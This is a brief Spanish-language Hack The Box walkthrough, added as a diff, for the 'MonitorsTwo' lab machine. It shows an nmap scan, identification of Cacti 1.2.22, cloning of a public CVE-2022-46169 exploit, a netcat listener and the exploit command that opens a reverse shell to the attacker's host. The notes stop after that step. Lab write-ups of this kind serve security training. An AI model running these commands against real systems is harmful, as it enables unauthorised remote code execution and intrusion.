@@ -1,0 +1,10 @@
+HACK THE BOX - MONITORSTWO MACHINE
+
+- sudo nmap -sC -sV -sS -pN 10.10.11.211 -oN NmapMonitorsTwo                                                                -Vericamos que tenemos dos puertos abiertos 22 y 80 con unservidor apache, nos conectamos a la página
+
+            - http://10.10.11.211                                                                                           -Ingresamos a la pagina he intentamos testeamos algunas vulnerabilidades login bruteforcing, pero no resulta, a lo que verificamos que se encuentra corriendo Cactis version 1.2.22, buscamos algún exploit en la web y encontramos un CVE relacionado y lo usamos
+
+- git clone https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22.git                                                    -Copiamos el repositorio en alguna ruta y lo ejecutamos, el comando necesita de algunos parametros mostrados a continuación:
+- nc -lvnp 4444                                                                                                             -Netcat a la escucha para establecer la RSC
+- python3 /opt/Cacti1222/CVE-2022-46169.py -u http://10.10.11.211 --LHOST=10.10.14.43 --LPORT=4444                          -Ejecutamos el comando, antes con un nc a la escucha para establecer la Reverse Shell Connection.
+-
